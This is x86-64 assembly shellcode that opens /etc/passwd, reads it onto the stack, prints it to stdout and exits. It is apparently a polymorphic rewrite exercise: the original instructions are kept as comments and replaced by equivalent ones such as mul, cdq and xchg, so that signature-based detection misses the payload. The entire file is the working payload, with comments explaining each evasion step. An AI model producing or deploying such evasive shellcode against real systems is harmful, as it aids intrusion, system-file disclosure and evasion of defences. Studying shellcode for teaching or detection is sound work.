global _start

section .text

_start:
	;jmp _push_filename
	jmp _readfile
	path: db "/etc/passwdA"

	
_readfile:
	;pop rdi
	lea rdi, [rel path]   ; use the RIP Relative Addressing technique to load the address of /etc/passwd into RDI

	;xor byte [rdi + 11], 0x41 
	;xor rax, rax

	xor r9, r9          ; zero out R9
	mul r9              ; multiply R9 with AL and store the result in AL, making AL equal to 0
	mov [rdi + 11], al  ; move 0 into the memory address of [rdi + 11]

	;add al, 2
	mov al, 0x2         ; move 2 into AL

	;xor rsi, rsi
	mov rsi, r9         ; move 0 into RSI   

	syscall
	  
	sub sp, 0xfff
	;lea rsi, [rsp]
	mov rsi, rsp        ; move the memory address pointed to by RSP into RSI
	
	mov rdi, rax

	;xor rdx, rdx
	cdq                 ; convert double word to quad word - extends the sign bit of RAX into the RDX register, this sets the value of RDX to 0

	mov dx, 0xfff
	;xor rax, rax

	xor rcx, rcx         ; zero out RCX
	xchg rax, rcx        ; exchange the register values, making RAX contain 0

	syscall

	xor rdi, rdi
	;add dil, 1
	
	mov dil, 1           ; move 1 into DIL


	mov rdx, rax
	xor rax, rax

	;add al, 1
	add al, 2            ; add 2 to AL
	sub al, 1            ; subtract 1 from AL making it contain 1

	syscall
	  
	;xor rax, rax
	xchg rax, r9         ; r9 contains 0, so exchange that value with RAX and zero it out

	add al, 60

	syscall
	  
	;_push_filename:
	;call _readfile
	;path: db "/etc/passwdA"